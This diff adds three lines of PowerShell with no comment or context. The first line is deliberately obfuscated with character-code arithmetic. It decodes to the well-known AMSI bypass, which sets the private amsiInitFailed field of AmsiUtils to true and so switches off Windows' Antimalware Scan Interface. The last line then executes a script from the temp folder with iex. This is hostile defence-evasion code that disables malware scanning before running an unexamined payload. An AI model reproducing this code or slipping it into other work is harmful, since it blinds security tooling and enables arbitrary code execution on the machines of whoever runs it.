@@ -1,0 +1,3 @@
+[Ref].Assembly.GetType("System.Management.Automation.$([CHar](65)+[cHar](109)+[CHar]([BYTe]0x73)+[cHAr](111-6)+[char](85)+[ChAR](2+114)+[ChAr]([byte]0x69)+[cHAr]([byTe]0x6C)+[CHAR](115))").GetField($([char](170-73)+[char](109)+[chAr](7705/67)+[ChaR]([ByTE]0x69)+[chaR](28+45)+[CHAR](54+56)+[char](112-7)+[ChaR](9048/78)+[CHar]([bYTe]0x46)+[chAR](97)+[char](180-75)+[Char]([BYte]0x6C)+[chAR](2020/20)+[cHAr](100)),"NonPublic,Static").SetValue($null,$true);
+ 
+iex $env:temp\Get-Content.PS1
